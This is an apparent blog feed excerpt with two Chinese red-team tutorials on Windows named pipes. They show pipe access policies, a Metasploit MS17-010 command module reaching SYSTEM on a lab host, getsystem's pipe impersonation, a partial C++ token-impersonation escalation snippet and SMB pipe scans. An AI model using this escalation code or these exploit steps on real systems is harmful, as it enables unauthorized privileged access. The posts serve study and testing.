        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-none"><code class="language-none">上一篇已知命名管道从代码层的基本原理实现，及其实际作战中遭遇反弹shell受阻时的使用方式，此处进步针对实际管道应用中进行展开，补充先前所不足<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h2><pre class="line-numbers language-none"><code class="language-none">命名管道支持跨网络的访问连接，但是会受到访问控制列表或者本地策略的管控在03及以下的版本中，默认开启了匿名管通信，但是在其上的版本中默认禁止匿名管道通信（含win7）如下03的默认策略，允许部分的管道匿名访问<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe2/image-20211103103930335.png" alt="image-20211103103930335"></p><pre class="line-numbers language-none"><code class="language-none">后面版本的系统，如下的默认策略完全禁止了匿名访问<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe2/image-20211103104236077.png" alt="image-20211103104236077"></p><h3 id="带来影响"><a href="#带来影响" class="headerlink" title="带来影响"></a>带来影响</h3><pre class="line-numbers language-none"><code class="language-none">远程计算机开启管道，本地计算机尝试通过管道写入内容，此时并无权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe2/image-20211103104926935.png" alt="image-20211103104926935"></p><pre class="line-numbers language-none"><code class="language-none">通过smb认证后，将建立有效连接，此时就能够实现管道的数据交互如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe2/image-20211103105057615.png" alt="image-20211103105057615"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">这也正是msf中17010针对2008或者2012等如下使用是无法利用成功的根本原因msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">></span> run<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.3.144:445     - Target OS: Windows Server <span class="token number">2012</span> Datacenter <span class="token number">9200</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token number">192.168</span>.3.144:445     - Unable to <span class="token function">find</span> accessible named pipe<span class="token operator">!</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.3.144:445     - Scanned <span class="token number">1</span> of <span class="token number">1</span> hosts <span class="token punctuation">(</span><span class="token number">100</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe2/image-20211103110044508.png" alt="image-20211103110044508"></p><pre class="line-numbers language-none"><code class="language-none">那么在设置匿名访问后，或者提供有效的身份验证后就可以执行成功msf6 auxiliary(admin&#x2F;smb&#x2F;ms17_010_command) &gt; run[*] 192.168.3.144:445     - Target OS: Windows Server 2012 Datacenter 9200[*] 192.168.3.144:445     - Built a write-what-where primitive...[+] 192.168.3.144:445     - Overwrite complete... SYSTEM session obtained![+] 192.168.3.144:445     - Service start timed out, OK if running a command or non-service executable...[*] 192.168.3.144:445     - Getting the command output...[*] 192.168.3.144:445     - Executing cleanup...[+] 192.168.3.144:445     - Cleanup was successful[+] 192.168.3.144:445     - Command completed successfully![*] 192.168.3.144:445     - Output for &quot;whoami&quot;:nt authority\system[*] 192.168.3.144:445     - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedmsf6 auxiliary(admin&#x2F;smb&#x2F;ms17_010_command) &gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe2/image-20211103110151250.png" alt="image-20211103110151250"></p><h2 id="令牌模拟"><a href="#令牌模拟" class="headerlink" title="令牌模拟"></a>令牌模拟</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">除了绕过防火墙利用命名管道进行交互shell，甚至作为c2通信通道外，还能够进行令牌模拟，一般能够实现提权操作，msf下的getsystem利用的就是这个原理Technique <span class="token number">1</span> creates a named pipe from Meterpreter. It also creates and runs a <span class="token function">service</span> that runs cmd.exe /c <span class="token builtin class-name">echo</span> “some data” <span class="token operator">></span><span class="token punctuation">\</span>.<span class="token punctuation">\</span>pipe<span class="token punctuation">[</span>random pipe here<span class="token punctuation">]</span>. When the spawned cmd.exe connects to Meterpreter’s named pipe, Meterpreter has the opportunity to impersonate that security context. Impersonation of clients is a named pipes feature. The context of the <span class="token function">service</span> is SYSTEM, so when you impersonate it, you become SYSTEM.意思是msf将创建一个管道<span class="token operator">&amp;</span>一个服务，然后去运行cmd.exe /c <span class="token builtin class-name">echo</span> “some data” <span class="token operator">></span><span class="token punctuation">\</span>.<span class="token punctuation">\</span>pipe<span class="token punctuation">[</span>random pipe here<span class="token punctuation">]</span>，当cmd连接到msf的管道时，因为服务是system权限，所以msf也就获得一个system权限实际效果如下meterpreter <span class="token operator">></span> getuidServer username: ROOTKIT<span class="token punctuation">\</span>Administratormeterpreter <span class="token operator">></span> getsystem<span class="token punctuation">..</span>.got system via technique <span class="token number">1</span> <span class="token punctuation">(</span>Named Pipe Impersonation <span class="token punctuation">(</span>In Memory/Admin<span class="token punctuation">))</span>.meterpreter <span class="token operator">></span> getuidServer username: NT AUTHORITY<span class="token punctuation">\</span>SYSTEMmeterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe2/image-20211103131928607.png" alt="image-20211103131928607"></p><pre class="line-numbers language-none"><code class="language-none">此处需要了解如何模拟另个用户，在windows提供的方法中，进程可以模拟另一个用户的安全内容，如ftp服务器的进程允许用户进行身份验证，并且只允许访问特定用户用拥有的文件，则该进行可以模拟用户账户并允许windows强制实施其中ImpersonateNamedPipeClient是getsystem功能成功的关键，注意只有管道服务器端才可以调用此函数https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;api&#x2F;namedpipeapi&#x2F;nf-namedpipeapi-impersonatenamedpipeclientImpersonateNamedPipeClient命名管道允许服务端进程模拟已连接的客户端进程，调用此函数，命名管道文件系统会更改调用进程的线程，开始模拟从管道读取的最后一条消息的安全内容如当目标用户的进程连接并写入输入攻击者的命名管道，则攻击者能够调用ImpersonateNamedPipeClient模拟目标的令牌，从而模拟用户，进程必须拥有SeImpersonatePrivilege权限（身份证验证后模拟客户端，否则可能无法提权成功），常规情况下该权限一般是系统使用在本地服务账号或者网络账号的，所以当通过服务账户启动的服务漏洞后就可获取相关权限，如local service或network service，权限可能较低，但可以用他来进行权限提升至system默认情况服务端模拟客户端设置下如下：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe2/image-20211103135243672.png" alt="image-20211103135243672"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe2/image-20211103140806907.png" alt="image-20211103140806907"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe2/image-20211103140853657.png" alt="image-20211103140853657"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe2/image-20211103140328706.png" alt="image-20211103140328706"></p><pre class="line-numbers language-none"><code class="language-none">进步返回getsystem细节：1、getsystem创建一个新的windows服务，并以local system权限运行同时连接上命名管道2、getsystem再产生一个进程，该进程创建一个命名管道并等待服务的连接3、windows服务启动并连接到产生的进程的命名管道4、进程接收连接，并调用ImpersonateNamedPipeClient，通过模拟令牌获取system权限由此能够手动代码实现相关功能点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="具体实现模拟本地用户"><a href="#具体实现模拟本地用户" class="headerlink" title="具体实现模拟本地用户"></a>具体实现模拟本地用户</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">创建管道&amp;初始化&amp;监听，客户端传递信息，服务端接收信息，利用接收到的权限进行提权前半部分和建立管道通信大同小异，不再重复  重点，模拟system：if (ImpersonateNamedPipeClient(MyServerPipe) &#x3D;&#x3D; 0) &#123;&#x2F;&#x2F;&#x2F;&#x2F;https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;api&#x2F;namedpipeapi&#x2F;nf-namedpipeapi-impersonatenamedpipeclientcout &lt;&lt; &quot;impersonate client fail&quot; &lt;&lt; endl;return 0;&#125;if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &amp;ttoken)) &#123;&#x2F;&#x2F;https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;api&#x2F;processthreadsapi&#x2F;nf-processthreadsapi-openthreadtokencout &lt;&lt; &quot;open thread token fail&quot; &lt;&lt; endl;&#125;if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &amp;ptoken)) &#123; &#x2F;&#x2F;https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;api&#x2F;processthreadsapi&#x2F;nf-processthreadsapi-openprocesstokencout &lt;&lt; &quot;open process token fail&quot; &lt;&lt; endl;&#125;if (!DuplicateTokenEx(ttoken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &amp;dtoken)) &#123;&#x2F;&#x2F;https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;api&#x2F;securitybaseapi&#x2F;nf-securitybaseapi-duplicatetokenexcout &lt;&lt; &quot;duplicate thread token fail&quot; &lt;&lt; endl;&#125;cout &lt;&lt; &quot;impersonate system success&quot; &lt;&lt; endl;CreateProcessAsUserA、CreateProcessWithTokenW进行提权if (!CreateProcessAsUserA(dtoken, NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi)) &#123;printf(&quot;CreateProcessAsUserA failed (%d)\n&quot;, GetLastError());ZeroMemory(&amp;si, sizeof(si));si.cb &#x3D; sizeof(si);ZeroMemory(&amp;pi, sizeof(pi));if (!CreateProcessWithTokenW(dtoken, 0, command,  NULL,CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&amp;si, &amp;pi)) &#123;   msf下因为连接的管道是system此处模拟用system进行连接管道，实现效果如下，能够成功获取system令牌<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe2/image-20211104134457732.png" alt="image-20211104134457732"></p><pre class="line-numbers language-none"><code class="language-none">权限对比<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe2/image-20211104134634754.png" alt="image-20211104134634754"></p><h3 id="具体实现模拟远程用户"><a href="#具体实现模拟远程用户" class="headerlink" title="具体实现模拟远程用户"></a>具体实现模拟远程用户</h3><pre class="line-numbers language-none"><code class="language-none">使用默认的模拟令牌形式进行远程连接管道将会失败<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe2/image-20211104141023253.png" alt="image-20211104141023253"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe2/image-20211104141354462.png"></p><pre class="line-numbers language-none"><code class="language-none">这是因为客户端模拟产生的用户无法进行远程认证模拟客户端产生进程，是通过提取当前进程token产生，token仅存在sid&amp;acl等信息，不包含认证所需要的密码、hash，所以只能进行本地认证<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> NamedPipes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现&amp;利用命名管道</title>
      <link href="2021/11/02/shi-xian-li-yong-ming-ming-guan-dao/"/>
      <url>2021/11/02/shi-xian-li-yong-ming-ming-guan-dao/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><pre class="line-numbers language-none"><code class="language-none">命名管道是一个具有名称，可以单向或双面在一个服务器和一个或多个客户端之间进行通讯的管道。命名管道的所有实例拥有相同的名称，但是每个实例都有其自己的缓冲区和句柄，用来为不同客户端通许提供独立的管道。使用实例可使多个管道客户端同时使用相同的命名管道。命名管道的名称在本系统中是唯一的。命名管道可以被任意符合权限要求的进程访问。命名管道只能在本地创建。命名管道的客户端可以是本地进程（本地访问：\\.\pipe\PipeName）或者是远程进程（访问远程：\\ServerName\pipe\PipeName）命名管道使用比匿名管道灵活，服务端、客户端可以是任意进程，匿名管道一般情况下用于父子进程通讯。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="获取命名管道"><a href="#获取命名管道" class="headerlink" title="获取命名管道"></a>获取命名管道</h3><h4 id="本地查看"><a href="#本地查看" class="headerlink" title="本地查看"></a>本地查看</h4><pre class="line-numbers language-none"><code class="language-none">powershellv3以下的方式：[System.IO.Directory]::GetFiles(&quot;\\.\\pipe\\&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe/image-20211013152213703.png"></p><pre class="line-numbers language-none"><code class="language-none">v3以上：Get-ChildItem \\.\pipe\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe/image-20211013152316305.png" alt="image-20211013152316305"></p><pre class="line-numbers language-none"><code class="language-none">process explorer:\Device\NamedPipe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe/image-20211013152546118.png" alt="image-20211013152546118"></p><pre class="line-numbers language-none"><code class="language-none">浏览器直接获取：file:&#x2F;&#x2F;.&#x2F;&#x2F;pipe&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe/image-20211013152847203.png" alt="image-20211013152847203"></p><h4 id="远程查看"><a href="#远程查看" class="headerlink" title="远程查看"></a>远程查看</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">利用msf下的两个模块即可use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>pipe_auditoruse auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>pipe_dcerpc_auditormsf6 auxiliary<span class="token punctuation">(</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>pipe_auditor<span class="token punctuation">)</span> > run<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>159<span class="token punctuation">.</span>14:139    <span class="token operator">-</span> Pipes: \netlogon<span class="token punctuation">,</span> \lsarpc<span class="token punctuation">,</span> \samr<span class="token punctuation">,</span> \browser<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>159<span class="token punctuation">.</span>14:       <span class="token operator">-</span> Scanned 1 of 1 hosts <span class="token punctuation">(</span>100<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completedmsf6 auxiliary<span class="token punctuation">(</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>pipe_auditor<span class="token punctuation">)</span> > optionsModule options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>pipe_auditor<span class="token punctuation">)</span>:   Name         Current Setting                                                             Required  Description   <span class="token operator">--</span>-<span class="token operator">-</span>         <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span><span class="token operator">-</span>                                                             <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>  <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>   NAMED_PIPES  <span class="token operator">/</span>opt<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span>embedded<span class="token operator">/</span>framework<span class="token operator">/</span><span class="token keyword">data</span><span class="token operator">/</span>wordlists<span class="token operator">/</span>named_pipes<span class="token punctuation">.</span>tx  yes       List of named pipes to check                t   RHOSTS       192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>159<span class="token punctuation">.</span>14                                                              yes       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> see https:<span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>rapid7<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span>wiki<span class="token operator">/</span><span class="token keyword">Using</span><span class="token operator">-</span>Metasploit   SMBDomain    <span class="token punctuation">.</span>                                                                           no        The Windows domain to use <span class="token keyword">for</span> authentication   SMBPass                                                                                  no        The password <span class="token keyword">for</span> the specified username   SMBUser                                                                                  no        The username to authenticate as   THREADS      1                                                                           yes       The number of concurrent threads <span class="token punctuation">(</span>max one per host<span class="token punctuation">)</span>msf6 auxiliary<span class="token punctuation">(</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>pipe_auditor<span class="token punctuation">)</span> > run<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>159<span class="token punctuation">.</span>14:139    <span class="token operator">-</span> Pipes: \netlogon<span class="token punctuation">,</span> \lsarpc<span class="token punctuation">,</span> \samr<span class="token punctuation">,</span> \browser<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>159<span class="token punctuation">.</span>14:       <span class="token operator">-</span> Scanned 1 of 1 hosts <span class="token punctuation">(</span>100<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completedmsf6 auxiliary<span class="token punctuation">(</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>pipe_auditor<span class="token punctuation">)</span> ><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe/1.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msf6 auxiliary<span class="token punctuation">(</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>pipe_auditor<span class="token punctuation">)</span> > use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>pipe_dcerpc_auditormsf6 auxiliary<span class="token punctuation">(</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>pipe_dcerpc_auditor<span class="token punctuation">)</span> > optionsModule options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>pipe_dcerpc_auditor<span class="token punctuation">)</span>:   Name       Current Setting  Required  Description   <span class="token operator">--</span>-<span class="token operator">-</span>       <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span><span class="token operator">-</span>  <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>  <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>   RHOSTS     192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>159<span class="token punctuation">.</span>14   yes       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> see https:<span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>rapid7<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span>wiki<span class="token operator">/</span><span class="token keyword">Using</span><span class="token operator">-</span>Metasploit   SMBDomain  <span class="token punctuation">.</span>                no        The Windows domain to use <span class="token keyword">for</span> authentication   SMBPIPE    BROWSER          yes       The pipe name to use <span class="token punctuation">(</span>BROWSER<span class="token punctuation">)</span>   SMBPass                     no        The password <span class="token keyword">for</span> the specified username   SMBUser                     no        The username to authenticate as   THREADS    1                yes       The number of concurrent threads <span class="token punctuation">(</span>max one per host<span class="token punctuation">)</span>msf6 auxiliary<span class="token punctuation">(</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>pipe_dcerpc_auditor<span class="token punctuation">)</span> > runUUID 00000131<span class="token operator">-</span>0000<span class="token operator">-</span>0000<span class="token operator">-</span>c000<span class="token operator">-</span>000000000046 0<span class="token punctuation">.</span>0 OPEN VIA BROWSERUUID 00000134<span class="token operator">-</span>0000<span class="token operator">-</span>0000<span class="token operator">-</span>c000<span class="token operator">-</span>000000000046 0<span class="token punctuation">.</span>0 OPEN VIA BROWSERUUID 00000143<span class="token operator">-</span>0000<span class="token operator">-</span>0000<span class="token operator">-</span>c000<span class="token operator">-</span>000000000046 0<span class="token punctuation">.</span>0 OPEN VIA BROWSERUUID 0a74ef1c<span class="token operator">-</span>41a4<span class="token operator">-</span>4e06<span class="token operator">-</span>83ae<span class="token operator">-</span>dc74fb1cdd53 1<span class="token punctuation">.</span>0 OPEN VIA BROWSERUUID 0d72a7d4<span class="token operator">-</span>6148<span class="token operator">-</span>11d1<span class="token operator">-</span>b4aa<span class="token operator">-</span>00c04fb66ea0 1<span class="token punctuation">.</span>0 OPEN VIA BROWSERUUID 12b81e99<span class="token operator">-</span>f207<span class="token operator">-</span>4a4c<span class="token operator">-</span>85d3<span class="token operator">-</span>77b42f76fd14 1<span class="token punctuation">.</span>0 OPEN VIA BROWSERUUID 18f70770<span class="token operator">-</span>8e64<span class="token operator">-</span>11cf<span class="token operator">-</span>9af1<span class="token operator">-</span>0020af6e72f4 0<span class="token punctuation">.</span>0 OPEN VIA BROWSERUUID 1ff70682<span class="token operator">-</span>0a51<span class="token operator">-</span>30e8<span class="token operator">-</span>076d<span class="token operator">-</span>740be8cee98b 1<span class="token punctuation">.</span>0 OPEN VIA BROWSERUUID 300f3532<span class="token operator">-</span>38cc<span class="token operator">-</span>11d0<span class="token operator">-</span>a3f0<span class="token operator">-</span>0020af6b0add 1<span class="token punctuation">.</span>2 OPEN VIA BROWSERUUID 378e52b0<span class="token operator">-</span>c0a9<span class="token operator">-</span>11cf<span class="token operator">-</span>822d<span class="token operator">-</span>00aa0051e40f 1<span class="token punctuation">.</span>0 OPEN VIA BROWSERUUID 3faf4738<span class="token operator">-</span>3a21<span class="token operator">-</span>4307<span class="token operator">-</span>b46c<span class="token operator">-</span>fdda9bb8c0d5 1<span class="token punctuation">.</span>0 OPEN VIA BROWSERUUID 3faf4738<span class="token operator">-</span>3a21<span class="token operator">-</span>4307<span class="token operator">-</span>b46c<span class="token operator">-</span>fdda9bb8c0d5 1<span class="token punctuation">.</span>1 OPEN VIA BROWSERUUID 4b324fc8<span class="token operator">-</span>1670<span class="token operator">-</span>01d3<span class="token operator">-</span>1278<span class="token operator">-</span>5a47bf6ee188 3<span class="token punctuation">.</span>0 OPEN VIA BROWSERUUID 621dff68<span class="token operator">-</span>3c39<span class="token operator">-</span>4c6c<span class="token operator">-</span>aae3<span class="token operator">-</span>e68e2c6503ad 1<span class="token punctuation">.</span>0 OPEN VIA BROWSERUUID 629b9f66<span class="token operator">-</span>556c<span class="token operator">-</span>11d1<span class="token operator">-</span>8dd2<span class="token operator">-</span>00aa004abd5e 3<span class="token punctuation">.</span>0 OPEN VIA BROWSERUUID 63fbe424<span class="token operator">-</span>2029<span class="token operator">-</span>11d1<span class="token operator">-</span>8db8<span class="token operator">-</span>00aa004abd5e 1<span class="token punctuation">.</span>0 OPEN VIA BROWSERUUID 6bffd098<span class="token operator">-</span>a112<span class="token operator">-</span>3610<span class="token operator">-</span>9833<span class="token operator">-</span>012892020162 0<span class="token punctuation">.</span>0 OPEN VIA BROWSERUUID 6bffd098<span class="token operator">-</span>a112<span class="token operator">-</span>3610<span class="token operator">-</span>9833<span class="token operator">-</span>46c3f87e345a 1<span class="token punctuation">.</span>0 OPEN VIA BROWSERUUID 8d0ffe72<span class="token operator">-</span>d252<span class="token operator">-</span>11d0<span class="token operator">-</span>bf8f<span class="token operator">-</span>00c04fd9126b 1<span class="token punctuation">.</span>0 OPEN VIA BROWSERUUID afa8bd80<span class="token operator">-</span>7d8a<span class="token operator">-</span>11c9<span class="token operator">-</span>bef4<span class="token operator">-</span>08002b102989 1<span class="token punctuation">.</span>0 OPEN VIA BROWSERUUID f50aac00<span class="token operator">-</span>c7f3<span class="token operator">-</span>428e<span class="token operator">-</span>a022<span class="token operator">-</span>a6b71bfb9d43 1<span class="token punctuation">.</span>0 OPEN VIA BROWSER<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>159<span class="token punctuation">.</span>14:       <span class="token operator">-</span> Scanned 1 of 1 hosts <span class="token punctuation">(</span>100<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completedmsf6 auxiliary<span class="token punctuation">(</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>pipe_dcerpc_auditor<span class="token punctuation">)</span> ><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe/2.png"></p><h2 id="命名管道的创建-amp-通信"><a href="#命名管道的创建-amp-通信" class="headerlink" title="命名管道的创建&amp;通信"></a>命名管道的创建&amp;通信</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><pre class="line-numbers language-none"><code class="language-none">基本流程：创建命名管道-连接命名管道-读写命名管道创建管道的名字规范为\\.\pipe\管道名称，采用的是UNC格式第一段：指定服务器名称，.代表北极，*代表当前网络字段、域名、服务第二段：硬编码字符串，表示改文件从属于NTFS第三段：唯一定义标识的一个命名管道名字，能够设置多层目录创建管道的时候对管道的访问属性有双向、单向，（c-&gt;s,s-&gt;c）默认情况是无法直接使用命名管道来操控计算机通信的，此处也使用windowsapi实现常用函数为：CreateNamedPipeConnectNamedPipeWaitNamedPipeCreateFileReadFile基本服务端写法：CreateNamedPipe创建一个命名管道的实例句柄ConnectNamedPipe在命名管道实例上监听客户机的连接请求ReadFile、WriteFile从客户机接收数据或将数据发送到客户机DisconnectNamedPipe关闭命名管道连接CloseHandle关闭命名管道实例句柄基本客户端写法：此处注意，客户机不可创建命名管道实例，但可以打开来自服务器的现成实例WaitNamePipe等待一个命名管道实例提供给自己使用CreateFile建立与命名管道的连接ReadFile、WriteFile分别想服务器接收数据、发送数据CloseHandle关闭打开的命名管道会话<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="基本实现方式"><a href="#基本实现方式" class="headerlink" title="基本实现方式"></a>基本实现方式</h3><h4 id="服务端"><a href="#服务端" class="headerlink" 